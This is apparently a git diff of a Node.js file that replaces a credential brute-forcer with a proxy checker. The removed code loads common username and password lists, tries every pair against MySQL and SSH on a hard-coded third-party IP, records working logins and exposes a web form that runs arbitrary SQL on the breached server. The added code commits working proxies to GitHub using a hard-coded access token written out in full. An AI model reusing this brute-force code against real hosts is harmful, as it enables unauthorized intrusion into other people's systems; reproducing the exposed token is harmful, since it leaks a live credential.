@@ -1,141 +1,102 @@
+// index.js
+const fs = require('fs');
+const axios = require('axios');
+const { HttpsProxyAgent } = require('https-proxy-agent');
+const { SocksProxyAgent } = require('socks-proxy-agent');
 const express = require('express');
-const mysql = require('mysql2/promise');
-const { Client } = require('ssh2');
-const fetch = require('node-fetch');
 const app = express();
-const port = process.env.PORT || 10000;
 
-let logs = [];
-let connectedService = null;
-let connectionResult = null;
-let credentials = []; // قائمة user:pass
 
-const targetIP = '185.182.193.132';
+const GITHUB_USER = 'noon1231';
+const GITHUB_REPO = 'NOON';
+const FILE_PATH = 'p.txt';
+const GITHUB_TOKEN = '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';
+const RAW_URL = `https://raw.githubusercontent.com/${GITHUB_USER}/${GITHUB_REPO}/main/${FILE_PATH}`;
+const KEEP_ALIVE_URL = 'https://noon-9v11.onrender.com/';
+const BATCH_SIZE = 200; 
+const TIMEOUT = 4000; 
 
-// روابط لقوائم اليوزر والباسورد
-const usernameListURL = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames.txt';
-const passwordListURL = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt';
 
-// Ping لمنع توقف السيرفر على Render
-setInterval(() => {
-  fetch(`https://noon-9v11.onrender.com/`).catch(() => {});
-}, 60_000);
+let proxyList = [];
+let goodProxies = [];
+let checking = false;
+let lastUpdate = new Date();
 
-// تحميل القوائم
-async function loadCredentials() {
-  const users = await fetch(usernameListURL).then(res => res.text());
-  const passes = await fetch(passwordListURL).then(res => res.text());
-  const usernames = users.split('\n').filter(Boolean);
-  const passwords = passes.split('\n').filter(Boolean);
-  for (const user of usernames) {
-    for (const pass of passwords) {
-      credentials.push({ user, pass });
-    }
-  }
-  logs.push(`📥 تم تحميل ${credentials.length} بيانات تسجيل`);
+
+async function loadProxies() {
+  const res = await axios.get(RAW_URL);
+  proxyList = res.data.split(/\r?\n/).filter(line => line.trim());
 }
 
-// تجربة MySQL
-async function tryMySQL() {
-  for (const { user, pass } of credentials) {
-    try {
-      const conn = await mysql.createConnection({
-        host: targetIP,
-        port: 3306,
-        user,
-        password: pass,
-      });
-      const [rows] = await conn.execute('SHOW DATABASES;');
-      connectionResult = rows;
-      connectedService = 'MySQL';
-      logs.push(`✅ MySQL Connected - ${user}:${pass}`);
-      return;
-    } catch (e) {
-      logs.push(`❌ MySQL Failed: ${user}:${pass}`);
-    }
+
+async function testProxy(proxy) {
+  let agent;
+  if (proxy.startsWith('socks')) {
+    agent = new SocksProxyAgent(proxy);
+  } else {
+    agent = new HttpsProxyAgent(proxy);
+  }
+  try {
+    await axios.get('https://www.google.com', { httpsAgent: agent, timeout: TIMEOUT });
+    return true;
+  } catch (err) {
+    return false;
   }
 }
 
-// تجربة SSH
-async function trySSH() {
-  return new Promise((resolve) => {
-    let index = 0;
-    const tryNext = () => {
-      if (index >= credentials.length) return resolve();
-      const conn = new Client();
-      const { user, pass } = credentials[index++];
-      conn
-        .on('ready', () => {
-          connectedService = 'SSH';
-          logs.push(`✅ SSH Connected - ${user}:${pass}`);
-          connectionResult = '✅ Connected via SSH - يمكنك الآن تنفيذ الأوامر من /cmd';
-          conn.end();
-          resolve();
-        })
-        .on('error', () => {
-          logs.push(`❌ SSH Failed: ${user}:${pass}`);
-          tryNext();
-        })
-        .connect({
-          host: targetIP,
-          port: 22,
-          username: user,
-          password: pass,
-          readyTimeout: 5000,
-        });
-    };
-    tryNext();
-  });
+
+async function saveGoodProxies() {
+  const content = goodProxies.join('\n');
+  const url = `https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/contents/${FILE_PATH}`;
+  
+  const shaRes = await axios.get(url, { headers: { Authorization: `token ${GITHUB_TOKEN}` } });
+  const sha = shaRes.data.sha;
+  
+  await axios.put(url, {
+    message: 'Update working proxies',
+    content: Buffer.from(content).toString('base64'),
+    sha
+  }, { headers: { Authorization: `token ${GITHUB_TOKEN}` } });
 }
 
-// واجهة المستخدم
+
+async function checkAllProxies() {
+  if (checking) return;
+  checking = true;
+  goodProxies = [];
+  let index = 0;
+  while (index < proxyList.length) {
+    const batch = proxyList.slice(index, index + BATCH_SIZE);
+    const results = await Promise.all(batch.map(p => testProxy(p)));
+    results.forEach((res, i) => {
+      if (res) goodProxies.push(batch[i]);
+    });
+    index += BATCH_SIZE;
+    lastUpdate = new Date();
+    console.log(`Checked ${Math.min(index, proxyList.length)} / ${proxyList.length} proxies, good: ${goodProxies.length}`);
+  }
+  await saveGoodProxies();
+  checking = false;
+}
+
+// Keep-alive 
+setInterval(async () => {
+  try { await axios.get(KEEP_ALIVE_URL); } catch {}
+}, 5 * 60 * 1000);
+
+
 app.get('/', (req, res) => {
   res.send(`
-    <html style="background:#000;color:#0f0;padding:20px;font-family:monospace">
-      <h2>🔍 فحص SSH / MySQL على ${targetIP}</h2>
-      <p>⏳ الخدمة المتصلة: ${connectedService || 'لا يوجد اتصال بعد'}</p>
-      <p>📦 النتائج:</p>
-      <pre>${JSON.stringify(connectionResult, null, 2)}</pre>
-      <h3>📜 السجل:</h3>
-      <pre>${logs.slice(-20).join('\n')}</pre>
-      <form method="GET" action="/cmd">
-        <input name="q" placeholder="اكتب أمر SSH أو SQL" style="width:100%;padding:5px">
-        <button type="submit">تشغيل</button>
-      </form>
-    </html>
+    <h2>Proxy Checker NOON</h2>
+    <p>Last update: ${lastUpdate}</p>
+    <p>Total proxies: ${proxyList.length}</p>
+    <p>Good proxies: ${goodProxies.length}</p>
+    <p>Status: ${checking ? 'Checking...' : 'Idle'}</p>
   `);
 });
 
-// تنفيذ أوامر (لـ MySQL فقط حالياً)
-app.get('/cmd', async (req, res) => {
-  const cmd = req.query.q || '';
-  if (!connectedService) return res.send('❌ لم يتم الاتصال بأي خدمة بعد');
-
-  if (connectedService === 'MySQL') {
-    const { user, pass } = credentials.find(({ user, pass }) =>
-      logs.includes(`✅ MySQL Connected - ${user}:${pass}`)
-    );
-    try {
-      const conn = await mysql.createConnection({
-        host: targetIP,
-        port: 3306,
-        user,
-        password: pass,
-      });
-      const [rows] = await conn.execute(cmd);
-      return res.send(`<pre>${JSON.stringify(rows, null, 2)}</pre><a href="/">رجوع</a>`);
-    } catch (e) {
-      return res.send('❌ خطأ في تنفيذ الأمر');
-    }
-  }
-
-  res.send('🔒 SSH: تنفيذ الأوامر غير مفعل بعد');
-});
-
-// تشغيل السيرفر
-app.listen(port, async () => {
-  logs.push(`🚀 Running on port ${port}`);
-  await loadCredentials();
-  await tryMySQL();
-  await trySSH();
+app.listen(10000, async () => {
+  console.log('Server running on port 10000');
+  await loadProxies();
+  checkAllProxies(); 
 });
